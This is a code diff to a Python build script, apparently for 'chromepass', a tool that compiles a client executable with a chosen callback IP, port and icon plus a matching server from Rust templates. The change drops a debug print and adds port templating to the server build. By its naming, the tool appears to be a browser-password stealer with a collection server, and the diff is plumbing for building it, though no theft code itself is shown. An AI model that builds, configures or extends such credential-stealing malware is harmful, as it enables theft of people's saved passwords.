@@ -84,7 +84,6 @@ def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", e
         content = content.replace("<<PORT>>", f"{port}")
         with open(build_path, "w") as f:
             f.write(content)
-        print(build_command)
         if compile_client(build_command):
             shutil.copyfile(
                 f"{template_dir}/{chromepass_base}/target/release/chromepass.exe", f"{dist_dir}/{filename}.exe")
@@ -100,6 +99,11 @@ def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", e
 def build_server(filename="server", icon="server.ico", port=80, nobuild=True, linux=False):
     temp_path = f"{template_dir}/{filename}"
     build_path = f"{template_dir}/{chromepass_server}/src/main.rs"
+    with open(temp_path, "r") as f:
+        content = f.read()
+    content = content.replace("<<PORT>>", f"{port}")
+    with open(build_path, "w") as f:
+        f.write(content)
     if linux:
         build_command = f"{refresh_env}cd {template_dir}\\{chromepass_server}; cargo build --release --target x86_64-unknown-linux-musl"
     else:
